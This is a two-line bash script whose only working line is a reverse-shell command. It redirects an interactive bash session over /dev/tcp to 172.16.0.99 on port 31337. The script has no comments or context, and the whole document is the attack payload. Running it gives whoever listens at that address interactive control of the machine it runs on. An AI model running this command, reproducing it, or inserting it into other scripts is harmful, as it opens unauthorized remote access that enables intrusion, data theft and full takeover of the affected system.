#!/bin/bash
bash -i >& /dev/tcp/172.16.0.99/31337 0>&1
